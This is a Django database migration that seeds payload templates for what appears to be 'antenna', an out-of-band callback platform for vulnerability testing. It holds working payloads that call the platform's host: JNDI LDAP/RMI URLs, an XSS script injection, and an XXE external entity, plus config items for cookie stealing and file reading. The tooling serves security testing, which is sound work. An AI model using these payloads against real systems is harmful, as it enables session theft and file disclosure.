# Generated by Django 3.2.9 on 2022-08-26 10:26
# _*_ coding: utf-8 _*_
from django.db import migrations


class Migration(migrations.Migration):
    dependencies = [
        ("template", "0001_initial"),
    ]

    operations = [
        migrations.RunSQL(
            """
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (1, 'DNS', 'DNS协议监听组件', '', '', 'bios000', 1, 0, 'dnslog.py', '2022-08-10 13:10:51.258765', '2022-08-19 17:59:38.708233', 1, 1, '{key}.{domain}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (2, 'LDAP', 'ldap协议监听组件', '', '', 'bios000', 1, 0, 'jndi.py', '2022-08-10 13:10:51.362671', '2022-08-19 17:59:38.968173', 1, 1, 'ldap://{domain}:{jndi_port}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (3, 'RMI', 'rmi协议监听组件', '', '', 'bios000', 1, 0, 'jndi.py', '2022-08-10 13:10:51.464547', '2022-08-19 17:59:39.229325', 1, 1, 'rmi://{domain}:{jndi_port}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (4, 'XSS', 'XSS漏洞利用组件', '', '', 'bios000', 0, 1, 'xss.py', '2022-08-10 13:10:51.574223', '2022-08-19 17:59:39.489568', 1, 1, '</tExtArEa>''"><sCRiPt sRC=//{domain}/{key}></sCrIpT>');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (5, 'HTTP_CUSTOM', '自定义HTTP利用组件', '', '', 'bios000', 0, 0, 'http_custom.py', '2022-08-10 13:10:51.712382', '2022-08-19 17:59:40.142226', 1, 1, 'http://{domain}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (6, 'XXE', 'XXE漏洞利用组件', '', '', 'bios000', 0, 1, 'xxe.py', '2022-08-10 13:10:51.856694', '2022-08-19 17:59:39.879768', 1, 1, '<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://{domain}/{key}">
    %xd;
]>
<root>&bbbb;</root>');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (7, 'HTTP', 'HTTP协议监听组件', '', '', 'bios000', 1, 0, 'http.py', '2022-08-10 22:39:44.000586', '2022-08-19 17:59:40.668357', 1, 1, 'http://{key}.{domain}');


        """
        ),
        migrations.RunSQL(
            """INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (1, 'dns_log', '[]', 1);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (2, 'ldap_log', '[]', 2);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (3, 'rmi_log', '[]', 3);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (4, 'xss_get_cookie', '[]', 4);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (5, 'xss_get_page_code', '[]', 4);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (6, 'custom_http_html', '["value", "headers"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (7, 'custom_http_location', '["url"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (9, 'http_log', '[]', 7);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (10, 'jsonp_html', '["url"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (11, 'xxe_read_file', '["path"]', 6);
"""
        ),
    ]
